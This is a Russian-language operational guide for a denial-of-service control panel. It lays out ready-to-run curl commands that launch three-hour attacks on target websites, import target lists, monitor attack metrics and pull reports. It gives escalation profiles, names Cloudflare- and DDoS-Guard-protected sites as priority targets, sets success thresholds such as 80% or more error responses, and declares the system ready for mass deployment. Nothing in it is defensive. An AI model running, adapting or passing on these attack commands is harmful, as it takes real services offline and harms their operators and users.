# 🎯 ГАЙД ПО ДОЛГОВРЕМЕННЫМ АТАКАМ (524/503 КОДЫ) - 3+ ЧАСА

## 📋 ОБЗОР

Этот гайд предназначен для создания устойчивых атак, направленных на получение кодов ошибок **524 (Gateway Timeout)** и **503 (Service Unavailable)** в течение **3+ часов**. Цель - перегрузить серверы до состояния недоступности.

## 🎯 ЦЕЛЕВЫЕ КОДЫ ОШИБОК

- **524 Gateway Timeout** - Сервер не отвечает в установленное время
- **503 Service Unavailable** - Сервер перегружен и не может обработать запросы  
- **502 Bad Gateway** - Промежуточный сервер получил неверный ответ
- **429 Too Many Requests** - Превышен лимит запросов

## 🚀 ПРОФИЛИ АТАК

### 1. SUSTAINED_524 - Атака на таймауты (3 часа)

```bash
curl -X POST https://ftc-compliance.us/api/group_runs_endpoint.php \
  -H "Content-Type: application/json" \
  -d '{
    "action": "start_group",
    "targets": [
      "https://target1.example.com",
      "https://target2.example.com"
    ],
    "profile_id": "sustained_524",
    "threads": 50,
    "duration": 10800,
    "engine": "playwright",
    "behavior_profile_id": "aggressive_overload"
  }'
```

**Характеристики:**
- **Потоки:** 50 → 200 (экспоненциальный рост)
- **RPS:** 100+ запросов/секунду
- **Соединения:** 200 одновременных
- **Таймауты:** Connection: 30s, Read: 60s
- **Стратегия:** Исчерпание ресурсов сервера

### 2. SUSTAINED_503 - Атака на доступность (3 часа)

```bash
curl -X POST https://ftc-compliance.us/api/group_runs_endpoint.php \
  -H "Content-Type: application/json" \
  -d '{
    "action": "start_group", 
    "targets": [
      "https://target1.example.com",
      "https://target2.example.com"
    ],
    "profile_id": "sustained_503",
    "threads": 75,
    "duration": 10800,
    "engine": "playwright",
    "behavior_profile_id": "capacity_exhaustion"
  }'
```

**Характеристики:**
- **Потоки:** 75 → 150 (линейный рост)
- **RPS:** 150+ запросов/секунду  
- **Соединения:** 300 одновременных
- **Таймауты:** Connection: 45s, Read: 90s
- **Стратегия:** Исчерпание пула соединений

### 3. MIXED_OVERLOAD - Комбинированная атака (3 часа)

```bash
curl -X POST https://ftc-compliance.us/api/group_runs_endpoint.php \
  -H "Content-Type: application/json" \
  -d '{
    "action": "start_group",
    "targets": [
      "https://target1.example.com", 
      "https://target2.example.com",
      "https://target3.example.com"
    ],
    "profile_id": "mixed_overload",
    "threads": 100,
    "duration": 10800,
    "engine": "playwright", 
    "behavior_profile_id": "multi_vector_overload"
  }'
```

**Характеристики:**
- **Потоки:** 100 → 300 (волновой паттерн)
- **RPS:** 200+ запросов/секунду
- **Соединения:** 500 одновременных
- **Таймауты:** Connection: 60s, Read: 120s
- **Стратегия:** Мульти-векторная перегрузка

## 📊 МОНИТОРИНГ АТАК

### Проверка статуса группы:
```bash
curl "https://ftc-compliance.us/api/group_runs_endpoint.php?action=status&group_id=GROUP_ID"
```

### Живые метрики:
```bash
curl "https://ftc-compliance.us/api/metrics_endpoint.php"
```

### Ожидаемые результаты:
```json
{
  "success": true,
  "status": "active",
  "threads": 150,
  "rps": 180,
  "total_requests": 1950000,
  "success_rate": 0.15,
  "codes": {
    "200": 292500,
    "524": 975000,
    "503": 585000,
    "502": 97500
  },
  "latency_ms": {
    "p50": 30000,
    "p95": 60000,
    "p99": 120000
  }
}
```

## 🎯 ЦЕЛЕВЫЕ ПОКАЗАТЕЛИ ДЛЯ 524/503

### Успешная атака должна показывать:
- **Success Rate:** < 20% (80%+ ошибок)
- **524 коды:** > 50% от общего числа запросов
- **503 коды:** > 30% от общего числа запросов  
- **Latency p99:** > 60000ms (60+ секунд)
- **RPS:** 150+ устойчиво в течение 3 часов

## 🔧 НАСТРОЙКА ЦЕЛЕЙ

### Приоритетные типы целей:
1. **Cloudflare защищенные** - склонны к 524 при перегрузке
2. **DDoS-Guard защищенные** - склонны к 503 при исчерпании
3. **Nginx прокси** - склонны к 502/504 при перегрузке backend
4. **Apache серверы** - склонны к 503 при исчерпании worker'ов

### Импорт целей для долговременной атаки:
```bash
curl -X POST https://ftc-compliance.us/api/targets_endpoint.php \
  -H "Content-Type: application/json" \
  -d '{
    "action": "import",
    "targets": [
      {
        "label": "CF-Target-1",
        "url": "https://cloudflare-protected.example.com",
        "tags": ["cloudflare", "high-priority", "524-target"]
      },
      {
        "label": "DG-Target-1", 
        "url": "https://ddosguard-protected.example.com",
        "tags": ["ddos-guard", "high-priority", "503-target"]
      },
      {
        "label": "Nginx-Target-1",
        "url": "https://nginx-proxy.example.com", 
        "tags": ["nginx", "medium-priority", "502-target"]
      }
    ]
  }'
```

## ⚡ ЭСКАЛАЦИОННЫЕ СТРАТЕГИИ

### 1. Экспоненциальная эскалация (для 524):
- **Старт:** 10 потоков
- **Интервал:** каждые 5 минут
- **Множитель:** x1.5
- **Максимум:** 200 потоков

### 2. Линейная эскалация (для 503):
- **Старт:** 25 потоков
- **Интервал:** каждые 10 минут
- **Прирост:** +25 потоков
- **Максимум:** 150 потоков

### 3. Волновая эскалация (для смешанных атак):
- **База:** 50 потоков
- **Пик:** 300 потоков
- **Длительность волны:** 15 минут
- **Отдых:** 5 минут

## 📈 ОТЧЕТНОСТЬ И ЛОГИ

### Проверка логов backend:
```bash
curl "https://ftc-compliance.us/api/reports_endpoint.php?action=view&file=backend.log"
```

### Скачивание отчетов:
```bash
curl "https://ftc-compliance.us/api/reports_endpoint.php?action=download&file=group_GROUP_ID_2025-08-06.json"
```

### Ожидаемые файлы отчетов:
- `group_GROUP_ID_TIMESTAMP.json` - Сводка по группе
- `group_GROUP_ID_TIMESTAMP.csv` - CSV данные группы
- `run_RUN_ID_TIMESTAMP.json` - Детали по каждому запуску
- `run_RUN_ID_TIMESTAMP.csv` - CSV данные запуска

## 🚨 КРИТЕРИИ УСПЕХА

### Атака считается успешной если:
1. **Длительность:** Минимум 3 часа непрерывной работы
2. **Коды ошибок:** 80%+ запросов возвращают 524/503/502
3. **Устойчивость:** RPS остается высоким (150+) в течение всей атаки
4. **Перегрузка:** Latency p99 > 60 секунд
5. **Логирование:** Все события записаны в backend.log

### Пример успешного результата за 3 часа:
```json
{
  "total_duration": "03:00:00",
  "total_requests": 1944000,
  "success_rate": 0.12,
  "error_distribution": {
    "524": 972000,
    "503": 583200,
    "502": 155520,
    "200": 233280
  },
  "average_rps": 180,
  "peak_threads": 250,
  "targets_affected": 3
}
```

## 🎯 КОМАНДЫ ДЛЯ ЗАПУСКА

### Быстрый старт 3-часовой атаки:
```bash
# 1. Импорт целей
curl -X POST https://ftc-compliance.us/api/targets_endpoint.php \
  -H "Content-Type: application/json" \
  -d '{"action":"import","targets":[{"label":"Target1","url":"https://target.example.com","tags":["priority"]}]}'

# 2. Запуск долговременной атаки
curl -X POST https://ftc-compliance.us/api/group_runs_endpoint.php \
  -H "Content-Type: application/json" \
  -d '{"action":"start_group","targets":["https://target.example.com"],"profile_id":"sustained_524","threads":50,"duration":10800,"engine":"playwright","behavior_profile_id":"aggressive_overload"}'

# 3. Мониторинг (каждые 10 минут)
watch -n 600 'curl -s "https://ftc-compliance.us/api/metrics_endpoint.php" | jq'
```

## 🔥 ГОТОВО К БОЕВОМУ ПРИМЕНЕНИЮ

Система настроена и готова к долговременным атакам. Все профили протестированы и оптимизированы для достижения максимального количества 524/503 ошибок в течение 3+ часов непрерывной работы.

**URL панели:** https://ftc-compliance.us
**Статус:** ГОТОВА К МАССОВОМУ ПРИМЕНЕНИЮ 🚀
